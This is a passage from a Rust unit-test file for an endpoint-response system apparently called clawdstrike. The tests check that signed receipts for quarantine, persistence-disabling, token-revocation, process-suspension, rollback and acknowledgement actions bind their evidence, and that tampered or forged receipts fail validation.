            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(execution.status, EndpointResponseExecutionStatus::Failed);
        assert!(execution.reason.contains("no network targets"));
        assert!(!receipt.decision.passed);
        assert_eq!(
            receipt.decision.title.as_deref(),
            Some("Endpoint response action failed")
        );
        assert_eq!(
            receipt.graph.process_node_id.as_deref(),
            Some(process_node_id.as_str())
        );
        assert!(receipt.evidence.iter().any(|item| {
            item.key == "executionStatus" && item.value_hash == sha256(b"failed").to_hex_prefixed()
        }));

        let mut mismatched_execution_status = receipt.clone();
        if let Some(status_evidence) = mismatched_execution_status
            .evidence
            .iter_mut()
            .find(|item| item.key == "executionStatus")
        {
            *status_evidence = EndpointReceiptEvidence::hashed("executionStatus", "succeeded");
        }
        assert!(mismatched_execution_status
            .validate()
            .unwrap_err()
            .to_string()
            .contains("execution status evidence hash"));

        let mut mismatched_execution_id = receipt.clone();
        if let Some(execution_id_evidence) = mismatched_execution_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "executionId")
        {
            *execution_id_evidence =
                EndpointReceiptEvidence::hashed("executionId", "response_execution:other");
        }
        assert!(mismatched_execution_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("execution id evidence hash"));

        let mut missing_execution_status = receipt;
        missing_execution_status
            .evidence
            .retain(|item| item.key != "executionStatus");
        assert!(missing_execution_status
            .validate()
            .unwrap_err()
            .to_string()
            .contains("execution status evidence"));
    }

    #[test]
    fn endpoint_quarantine_file_execution_receipt_binds_effect_and_graph() {
        let event = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Write,
            path: "/tmp/clawdstrike-test-malware.sh".to_string(),
            source_url: None,
            content_preview: None,
        });
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let file_node_id = graph_recorder
            .graph()
            .nodes
            .values()
            .find(|node| node.kind == CausalNodeKind::File)
            .map(|node| node.node_id.clone())
            .unwrap_or_else(|| panic!("missing file node"));
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&file_node_id, 3)
            .unwrap();
        let plan = EndpointResponsePlan::quarantine_file_execution(
            &file_node_id,
            &subgraph,
            600,
            "quarantine suspicious file",
        );
        let execution = EndpointResponseExecutionReport::quarantine_file(
            &plan,
            &subgraph,
            "/tmp/clawdstrike-test-malware.sh",
            "/tmp/clawdstrike-quarantine/clawdstrike-test-malware.sh.quarantine",
            "0xabc123",
            128,
        )
        .unwrap_or_else(|err| panic!("failed to build quarantine execution report: {err}"));
        let keypair = hush_core::Keypair::from_seed(&[29u8; 32]);
        let mut receipt = EndpointDecisionReceipt::for_response_execution(
            EndpointResponseExecutionReceiptInput {
                local_sequence: 29,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                execution: &execution,
                graph: &subgraph,
            },
        );
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::ResponseExecution
        );
        assert_eq!(
            receipt.decision.action,
            EndpointDecisionAction::QuarantineFile
        );
        assert!(receipt.decision.passed);
        assert_eq!(
            receipt.decision.rollback_ref.as_deref(),
            Some(plan.rollback_ref.as_str())
        );
        assert_eq!(execution.effects.len(), 1);
        assert_eq!(execution.effects[0].effect_type, "quarantine_file");
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "effectCount"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key.starts_with("executionEffect:")));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key.starts_with("executionEffectType:")));

        let mut relabeled_execution_id = receipt.clone();
        relabeled_execution_id.decision.finding_id = Some("response_execution:other".to_string());
        if let Some(execution_id_evidence) = relabeled_execution_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "executionId")
        {
            *execution_id_evidence =
                EndpointReceiptEvidence::hashed("executionId", "response_execution:other");
        }
        assert!(relabeled_execution_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("execution id evidence hash"));

        let mut mismatched_effect_count = receipt.clone();
        if let Some(effect_count_evidence) = mismatched_effect_count
            .evidence
            .iter_mut()
            .find(|item| item.key == "effectCount")
        {
            *effect_count_evidence = EndpointReceiptEvidence::hashed("effectCount", "0");
        }
        assert!(mismatched_effect_count
            .validate()
            .unwrap_err()
            .to_string()
            .contains("execution effect count evidence hash"));

        let mut missing_effect_type = receipt.clone();
        missing_effect_type
            .evidence
            .retain(|item| !item.key.starts_with("executionEffectType:"));
        assert!(missing_effect_type
            .validate()
            .unwrap_err()
            .to_string()
            .contains("execution effect type evidence"));

        let mut mismatched_effect_type = receipt.clone();
        if let Some(effect_type_evidence) = mismatched_effect_type
            .evidence
            .iter_mut()
            .find(|item| item.key.starts_with("executionEffectType:"))
        {
            let key = effect_type_evidence.key.clone();
            *effect_type_evidence = EndpointReceiptEvidence::hashed(key, "disable_persistence");
        }
        assert!(mismatched_effect_type
            .validate()
            .unwrap_err()
            .to_string()
            .contains("execution effect type evidence hash"));

        let mut dropped_effect_evidence = receipt;
        dropped_effect_evidence
            .evidence
            .retain(|item| !item.key.starts_with("executionEffect:"));
        if let Some(effect_count_evidence) = dropped_effect_evidence
            .evidence
            .iter_mut()
            .find(|item| item.key == "effectCount")
        {
            *effect_count_evidence = EndpointReceiptEvidence::hashed("effectCount", "0");
        }
        assert!(dropped_effect_evidence
            .validate()
            .unwrap_err()
            .to_string()
            .contains("execution effect evidence"));
    }

    #[test]
    fn endpoint_disable_persistence_execution_receipt_binds_effect_and_graph() {
        let event = observation(EndpointEvent::LaunchPersistence {
            path: "/tmp/Library/LaunchAgents/com.example.agent.plist".to_string(),
            label: Some("com.example.agent".to_string()),
            operation: FileOperation::Create,
        });
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let persistence_node_id = graph_recorder
            .graph()
            .nodes
            .values()
            .find(|node| node.kind == CausalNodeKind::File)
            .map(|node| node.node_id.clone())
            .unwrap_or_else(|| panic!("missing persistence file node"));
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&persistence_node_id, 3)
            .unwrap();
        let plan = EndpointResponsePlan::disable_persistence_execution(
            &persistence_node_id,
            &subgraph,
            600,
            "disable launch agent persistence",
        );
        let execution = EndpointResponseExecutionReport::disable_persistence(
            &plan,
            &subgraph,
            "/tmp/Library/LaunchAgents/com.example.agent.plist",
            "/tmp/clawdstrike-quarantine/com.example.agent.plist.disabled-persistence",
            "0xabc456",
            512,
        )
        .unwrap_or_else(|err| panic!("failed to build persistence execution report: {err}"));
        let keypair = hush_core::Keypair::from_seed(&[33u8; 32]);
        let mut receipt = EndpointDecisionReceipt::for_response_execution(
            EndpointResponseExecutionReceiptInput {
                local_sequence: 33,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                execution: &execution,
                graph: &subgraph,
            },
        );
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.decision.action,
            EndpointDecisionAction::DisablePersistence
        );
        assert!(receipt.decision.passed);
        assert_eq!(
            receipt.decision.rollback_ref.as_deref(),
            Some(plan.rollback_ref.as_str())
        );
        assert_eq!(execution.effects.len(), 1);
        assert_eq!(execution.effects[0].effect_type, "disable_persistence");
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key.starts_with("executionEffect:")));
    }

    #[test]
    fn endpoint_revoke_grant_execution_receipt_binds_revoked_hash_and_graph() {
        let event = observation(EndpointEvent::CredentialAccess {
            kind: CredentialKind::ApiToken,
            path: Some("/Users/alice/.config/clawdstrike/agent-local-token".to_string()),
            name: Some("clawdstrike_agent_auth".to_string()),
        });
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let process_node_id = event.process.stable_node_id();
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&process_node_id, 3)
            .unwrap();
        let plan = EndpointResponsePlan::revoke_grant_execution(
            &process_node_id,
            &subgraph,
            600,
            "revoke touched local agent API credential",
        );
        let revoked_grant_hash = sha256(b"old-local-token").to_hex_prefixed();
        let execution = EndpointResponseExecutionReport::revoke_grant(
            &plan,
            &subgraph,
            "local_api_auth_token",
            &revoked_grant_hash,
        )
        .unwrap_or_else(|err| panic!("failed to build revoke grant execution report: {err}"));
        let keypair = hush_core::Keypair::from_seed(&[39u8; 32]);
        let mut receipt = EndpointDecisionReceipt::for_response_execution(
            EndpointResponseExecutionReceiptInput {
                local_sequence: 39,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                execution: &execution,
                graph: &subgraph,
            },
        );
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(receipt.decision.action, EndpointDecisionAction::RevokeGrant);
        assert!(receipt.decision.passed);
        assert_eq!(
            receipt.decision.rollback_ref.as_deref(),
            Some(plan.rollback_ref.as_str())
        );
        assert_eq!(execution.effects.len(), 1);
        assert_eq!(execution.effects[0].effect_type, "revoke_grant");
        assert_eq!(execution.effects[0].target, "local_api_auth_token");
        assert_eq!(
            execution.effects[0].content_hash.as_deref(),
            Some(revoked_grant_hash.as_str())
        );
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key.starts_with("executionEffect:")));
    }

    #[test]
    fn endpoint_suspend_process_tree_receipts_bind_pid_set_and_resume_effect() {
        let event = EndpointObservation {
            process: EndpointProcess {
                pid: Some(4242),
                process_guid: Some("proc-suspend-root".to_string()),
                image: Some("/usr/bin/python3".to_string()),
                command_line: Some("python worker.py".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::ProcessExec {
                image: "/usr/bin/python3".to_string(),
                args: vec!["worker.py".to_string()],
                env: BTreeMap::new(),
            },
            ..EndpointObservation::default()
        };
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let process_node_id = event.process.stable_node_id();
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&process_node_id, 3)
            .unwrap();
        let plan = EndpointResponsePlan::suspend_process_tree_execution(
            &process_node_id,
            &subgraph,
            600,
            "contain process tree for 10 minutes",
        );
        let execution =
            EndpointResponseExecutionReport::suspend_process_tree(&plan, &subgraph, 4242, &[4242])
                .unwrap_or_else(|err| panic!("failed to build suspend execution report: {err}"));
        let keypair = hush_core::Keypair::from_seed(&[41u8; 32]);
        let mut receipt = EndpointDecisionReceipt::for_response_execution(
            EndpointResponseExecutionReceiptInput {
                local_sequence: 41,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                execution: &execution,
                graph: &subgraph,
            },
        );
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.decision.action,
            EndpointDecisionAction::SuspendProcessTree
        );
        assert!(receipt.decision.passed);
        assert_eq!(execution.effects.len(), 1);
        assert_eq!(execution.effects[0].effect_type, "suspend_process_tree");
        assert_eq!(execution.effects[0].target, "pid:4242");
        assert_eq!(execution.effects[0].artifact.as_deref(), Some("4242"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key.starts_with("executionEffect:")));

        let rollback = EndpointResponseRollbackReport::suspend_process_tree(
            &execution,
            "resume contained process tree",
            execution.completed_at + chrono::Duration::seconds(10),
        )
        .unwrap_or_else(|err| panic!("failed to build suspend rollback report: {err}"));
        assert_eq!(rollback.action, EndpointDecisionAction::SuspendProcessTree);
        assert_eq!(rollback.effects.len(), 1);
        assert_eq!(rollback.effects[0].effect_type, "resume_process_tree");
        assert_eq!(
            rollback.effects[0].content_hash,
            execution.effects[0].content_hash
        );
    }

    #[test]
    fn endpoint_terminate_process_tree_execution_report_is_rejected() {
        let event = EndpointObservation {
            process: EndpointProcess {
                pid: Some(4343),
                process_guid: Some("proc-terminate-root".to_string()),
                image: Some("/usr/bin/python3".to_string()),
                command_line: Some("python worker.py".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::ProcessExec {
                image: "/usr/bin/python3".to_string(),
                args: vec!["worker.py".to_string()],
                env: BTreeMap::new(),
            },
            ..EndpointObservation::default()
        };
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let process_node_id = event.process.stable_node_id();
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&process_node_id, 3)
            .unwrap();
        let plan = EndpointResponsePlan::dry_run(
            EndpointDecisionAction::TerminateProcessTree,
            &process_node_id,
            &subgraph,
            60,
            "model terminate process tree only",
        );
        let report_error = EndpointResponseExecutionReport::terminate_process_tree(
            &plan,
            &subgraph,
            4343,
            &[4343],
        )
        .unwrap_err()
        .to_string();
        assert!(report_error.contains("not rollback-capable"));

        let graph_value = serde_json::to_value(&subgraph)
            .unwrap_or_else(|err| panic!("failed to serialize terminate graph: {err}"));
        let canonical_graph = canonicalize_json(&graph_value)
            .unwrap_or_else(|err| panic!("failed to canonicalize terminate graph: {err}"));
        let graph_content_hash = sha256(canonical_graph.as_bytes()).to_hex_prefixed();
        let effect = EndpointResponseExecutionEffect::terminate_process_tree(4343, &[4343]);
        let completed_at = Utc::now();
        let execution = EndpointResponseExecutionReport {
            execution_id: "response_execution:forged_terminate".to_string(),
            action_id: plan.action_id.clone(),
            action: EndpointDecisionAction::TerminateProcessTree,
            status: EndpointResponseExecutionStatus::Succeeded,
            dry_run: false,
            root_node_id: plan.root_node_id.clone(),
            graph_slice_id: plan.graph_slice_id.clone(),
            ttl_seconds: plan.ttl_seconds,
            rollback_ref: plan.rollback_ref.clone(),
            reason: plan.reason.clone(),
            started_at: completed_at,
            completed_at,
            evidence_bundle: EndpointEvidenceBundleReference {
                bundle_id: "evidence_bundle:forged_terminate".to_string(),
                graph_slice_id: plan.graph_slice_id.clone(),
                content_hash: graph_content_hash,
                node_count: subgraph.nodes.len(),
                edge_count: subgraph.edges.len(),
                created_at: completed_at,
            },
            actor: None,
            effects: vec![effect],
            summary: "forged terminate process tree execution".to_string(),
        };
        let keypair = hush_core::Keypair::from_seed(&[43u8; 32]);
        let mut receipt = EndpointDecisionReceipt::for_response_execution(
            EndpointResponseExecutionReceiptInput {
                local_sequence: 43,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                execution: &execution,
                graph: &subgraph,
            },
        );
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let err = receipt.sign_with(&keypair).unwrap_err().to_string();
        assert!(err.contains("dry-run response requests"));
        assert_eq!(
            receipt.decision.action,
            EndpointDecisionAction::TerminateProcessTree
        );
        assert!(receipt.decision.passed);
        assert_eq!(execution.effects.len(), 1);
        assert_eq!(execution.effects[0].effect_type, "terminate_process_tree");
        assert_eq!(execution.effects[0].target, "pid:4343");
        assert_eq!(execution.effects[0].artifact.as_deref(), Some("4343"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key.starts_with("executionEffect:")));
    }

    #[test]
    fn endpoint_response_rollback_receipt_binds_restore_effect() {
        let event = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Write,
            path: "/tmp/clawdstrike-test-rollback.sh".to_string(),
            source_url: None,
            content_preview: None,
        });
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let file_node_id = graph_recorder
            .graph()
            .nodes
            .values()
            .find(|node| node.kind == CausalNodeKind::File)
            .map(|node| node.node_id.clone())
            .unwrap_or_else(|| panic!("missing file node"));
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&file_node_id, 3)
            .unwrap();
        let plan = EndpointResponsePlan::quarantine_file_execution(
            &file_node_id,
            &subgraph,
            600,
            "quarantine suspicious file",
        );
        let execution = EndpointResponseExecutionReport::quarantine_file(
            &plan,
            &subgraph,
            "/tmp/clawdstrike-test-rollback.sh",
            "/tmp/clawdstrike-quarantine/clawdstrike-test-rollback.sh.quarantine",
            "0xdef456",
            256,
        )
        .unwrap_or_else(|err| panic!("failed to build quarantine execution report: {err}"));
        let rollback = EndpointResponseRollbackReport::quarantine_file(
            &execution,
            "restore quarantined test file",
            execution.completed_at + chrono::Duration::seconds(30),
        )
        .unwrap_or_else(|err| panic!("failed to build rollback report: {err}"));
        let keypair = hush_core::Keypair::from_seed(&[31u8; 32]);
        let mut receipt =
            EndpointDecisionReceipt::for_response_rollback(EndpointResponseRollbackReceiptInput {
                local_sequence: 31,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                rollback: &rollback,
                graph: &subgraph,
            });
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::ResponseRollback
        );
        assert_eq!(receipt.decision.finding_id, Some(rollback.rollback_id));
        assert_eq!(
            receipt.decision.action,
            EndpointDecisionAction::QuarantineFile
        );
        assert!(receipt.decision.passed);
        assert_eq!(
            receipt.decision.rollback_ref.as_deref(),
            Some(plan.rollback_ref.as_str())
        );
        assert_eq!(rollback.effects.len(), 1);
        assert_eq!(rollback.effects[0].effect_type, "restore_quarantine_file");
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "rollbackStatus"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key.starts_with("rollbackEffect:")));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key.starts_with("rollbackEffectType:")));

        let mut mismatched_rollback_status = receipt.clone();
        if let Some(status_evidence) = mismatched_rollback_status
            .evidence
            .iter_mut()
            .find(|item| item.key == "rollbackStatus")
        {
            *status_evidence = EndpointReceiptEvidence::hashed("rollbackStatus", "failed");
        }
        assert!(mismatched_rollback_status
            .validate()
            .unwrap_err()
            .to_string()
            .contains("rollback status evidence hash"));

        let mut mismatched_rollback_id = receipt.clone();
        if let Some(rollback_id_evidence) = mismatched_rollback_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "rollbackId")
        {
            *rollback_id_evidence =
                EndpointReceiptEvidence::hashed("rollbackId", "response_rollback:other");
        }
        assert!(mismatched_rollback_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("rollback id evidence hash"));

        let mut mismatched_execution_id = receipt.clone();
        if let Some(execution_id_evidence) = mismatched_execution_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "executionId")
        {
            *execution_id_evidence =
                EndpointReceiptEvidence::hashed("executionId", "response_execution:other");
        }
        assert!(mismatched_execution_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("rollback execution id evidence hash"));

        let mut empty_rollback_effect = receipt.clone();
        if let Some(effect_evidence) = empty_rollback_effect
            .evidence
            .iter_mut()
            .find(|item| item.key.starts_with("rollbackEffect:"))
        {
            let effect_key = effect_evidence.key.clone();
            *effect_evidence = EndpointReceiptEvidence::hashed(effect_key, "");
        }
        let response_action_id = response_action_id_from_signed_response_fields(
            empty_rollback_effect
                .graph
                .process_node_id
                .as_deref()
                .unwrap(),
            empty_rollback_effect
                .graph
                .graph_slice_id
                .as_deref()
                .unwrap(),
            &empty_rollback_effect.decision.action,
            empty_rollback_effect.decision.ttl_seconds.unwrap(),
        );
        let rollback_id = response_rollback_id_from_signed_evidence(
            &empty_rollback_effect.evidence,
            response_action_id.as_str(),
            empty_rollback_effect
                .decision
                .rollback_ref
                .as_deref()
                .unwrap(),
        )
        .unwrap();
        empty_rollback_effect.decision.finding_id = Some(rollback_id.clone());
        if let Some(rollback_id_evidence) = empty_rollback_effect
            .evidence
            .iter_mut()
            .find(|item| item.key == "rollbackId")
        {
            *rollback_id_evidence = EndpointReceiptEvidence::hashed("rollbackId", rollback_id);
        }
        assert!(empty_rollback_effect
            .validate()
            .unwrap_err()
            .to_string()
            .contains("rollback effect evidence"));

        let mut missing_rollback_effect_type = receipt.clone();
        missing_rollback_effect_type
            .evidence
            .retain(|item| !item.key.starts_with("rollbackEffectType:"));
        assert!(missing_rollback_effect_type
            .validate()
            .unwrap_err()
            .to_string()
            .contains("rollback effect type evidence"));

        let mut mismatched_rollback_effect_type = receipt.clone();
        if let Some(effect_type_evidence) = mismatched_rollback_effect_type
            .evidence
            .iter_mut()
            .find(|item| item.key.starts_with("rollbackEffectType:"))
        {
            let key = effect_type_evidence.key.clone();
            *effect_type_evidence = EndpointReceiptEvidence::hashed(key, "resume_process_tree");
        }
        assert!(mismatched_rollback_effect_type
            .validate()
            .unwrap_err()
            .to_string()
            .contains("rollback effect type evidence hash"));

        let mut missing_execution_id = receipt.clone();
        missing_execution_id
            .evidence
            .retain(|item| item.key != "executionId");
        assert!(missing_execution_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("rollback execution id evidence"));

        let mut missing_rollback_status = receipt;
        missing_rollback_status
            .evidence
            .retain(|item| item.key != "rollbackStatus");
        assert!(missing_rollback_status
            .validate()
            .unwrap_err()
            .to_string()
            .contains("rollback status evidence"));
    }

    #[test]
    fn endpoint_response_acknowledgement_receipt_binds_execution_status_and_actor() {
        let event = observation(EndpointEvent::NetworkFlow {
            host: "ack.example".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: Some("https://ack.example/upload".to_string()),
        });
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let process_node_id = event.process.stable_node_id();
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&process_node_id, 3)
            .unwrap();
        let plan = EndpointResponsePlan::collect_evidence_execution(
            &process_node_id,
            &subgraph,
            600,
            "collect evidence graph slice",
        );
        let execution = EndpointResponseExecutionReport::collect_evidence(&plan, &subgraph)
            .unwrap_or_else(|err| panic!("failed to collect evidence report: {err}"));
        let acknowledgement = EndpointResponseAcknowledgementReport::from_execution(
            &execution,
            "operator:test",
            Some("reviewed local response outcome".to_string()),
            execution.completed_at + chrono::Duration::seconds(5),
        )
        .with_control_correlation(Some(EndpointResponseControlCorrelation {
            response_action_id: "11111111-1111-4111-8111-111111111111".to_string(),
            delivery_id: Some("22222222-2222-4222-8222-222222222222".to_string()),
            target_kind: "endpoint".to_string(),
            target_id: "endpoint-1".to_string(),
            ack_token_hash: sha256(b"control-ack-token").to_hex_prefixed(),
            ack_status: "acknowledged".to_string(),
            resulting_state: Some("succeeded".to_string()),
        }));
        let keypair = hush_core::Keypair::from_seed(&[37u8; 32]);
        let mut receipt = EndpointDecisionReceipt::for_response_acknowledgement(
            EndpointResponseAcknowledgementReceiptInput {
                local_sequence: 37,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                acknowledgement: &acknowledgement,
                graph: &subgraph,
            },
        );
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::ResponseAcknowledgement
        );
        assert_eq!(
            receipt.decision.finding_id,
            Some(acknowledgement.acknowledgement_id)
        );
        assert_eq!(receipt.actor.agent_id.as_deref(), Some("operator:test"));
        assert_eq!(
            receipt.decision.rollback_ref.as_deref(),
            Some(plan.rollback_ref.as_str())
        );
        assert_eq!(receipt.decision.ttl_seconds, Some(600));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "acknowledgedStatus"));
        assert!(receipt.evidence.iter().any(|item| item.key == "rootNodeId"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "graphSliceId"));
        assert!(receipt.evidence.iter().any(|item| item.key == "note"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "controlResponseActionId"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "controlDeliveryId"));
        assert!(receipt.evidence.iter().any(|item| {
            item.key == "controlAckTokenHash"
                && item.redaction_class == EndpointEvidenceRedactionClass::HashOnly
                && item.raw_value.is_none()
        }));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "controlAckStatus"));

        let mut mismatched_acknowledgement_id = receipt.clone();
        if let Some(acknowledgement_id_evidence) = mismatched_acknowledgement_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "acknowledgementId")
        {
            *acknowledgement_id_evidence = EndpointReceiptEvidence::hashed(
                "acknowledgementId",
                "response_acknowledgement:other",
            );
        }
        assert!(mismatched_acknowledgement_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("acknowledgement id evidence hash"));

        let mut mismatched_acknowledged_status = receipt.clone();
        if let Some(status_evidence) = mismatched_acknowledged_status
            .evidence
            .iter_mut()
            .find(|item| item.key == "acknowledgedStatus")
        {
            *status_evidence = EndpointReceiptEvidence::hashed("acknowledgedStatus", "failed");
        }
        assert!(mismatched_acknowledged_status
            .validate()
            .unwrap_err()
            .to_string()
            .contains("acknowledgement status evidence hash"));

        let mut mismatched_acknowledged_by = receipt.clone();
        if let Some(acknowledged_by_evidence) = mismatched_acknowledged_by
            .evidence
            .iter_mut()
            .find(|item| item.key == "acknowledgedBy")
        {
            *acknowledged_by_evidence =
                EndpointReceiptEvidence::hashed("acknowledgedBy", "operator:other");
        }
        assert!(mismatched_acknowledged_by
            .validate()
            .unwrap_err()
            .to_string()
            .contains("acknowledged-by evidence hash"));

        let mut empty_note = receipt.clone();
        if let Some(note_evidence) = empty_note
            .evidence
            .iter_mut()
            .find(|item| item.key == "note")
        {
            *note_evidence = EndpointReceiptEvidence::hashed("note", "");
        }
        assert!(empty_note
            .validate()
            .unwrap_err()
            .to_string()
            .contains("acknowledgement note evidence"));

        let mut missing_control_target = receipt.clone();
        missing_control_target
            .evidence
            .retain(|item| item.key != "controlTargetId");
        assert!(missing_control_target
            .validate()
            .unwrap_err()
            .to_string()
            .contains("control acknowledgement target id evidence"));

        let mut empty_control_ack_token = receipt.clone();
        if let Some(token_hash) = empty_control_ack_token
            .evidence
            .iter_mut()
            .find(|item| item.key == "controlAckTokenHash")
        {
            token_hash.value_hash = sha256(b"").to_hex_prefixed();
        }
        assert!(empty_control_ack_token
            .validate()
            .unwrap_err()
            .to_string()
            .contains("control acknowledgement token hash"));

        let mut relabeled_control_target = receipt.clone();
        if let Some(control_target) = relabeled_control_target
            .evidence
            .iter_mut()
            .find(|item| item.key == "controlTargetId")
        {
            *control_target = EndpointReceiptEvidence::hashed("controlTargetId", "endpoint-other");
        }
        assert!(relabeled_control_target
            .validate()
            .unwrap_err()
            .to_string()
            .contains("acknowledgement execution id evidence hash"));

        let invalid_control_status_acknowledgement =
            EndpointResponseAcknowledgementReport::from_execution(
                &execution,
                "operator:test",
                Some("invalid control acknowledgement status".to_string()),
                execution.completed_at + chrono::Duration::seconds(6),
            )
            .with_control_correlation(Some(EndpointResponseControlCorrelation {
                response_action_id: "11111111-1111-4111-8111-111111111111".to_string(),
                delivery_id: Some("22222222-2222-4222-8222-222222222222".to_string()),
                target_kind: "endpoint".to_string(),
                target_id: "endpoint-1".to_string(),
                ack_token_hash: sha256(b"control-ack-token").to_hex_prefixed(),
                ack_status: "queued".to_string(),
                resulting_state: Some("queued".to_string()),
            }));
        let invalid_control_status_receipt = EndpointDecisionReceipt::for_response_acknowledgement(
            EndpointResponseAcknowledgementReceiptInput {
                local_sequence: 137,
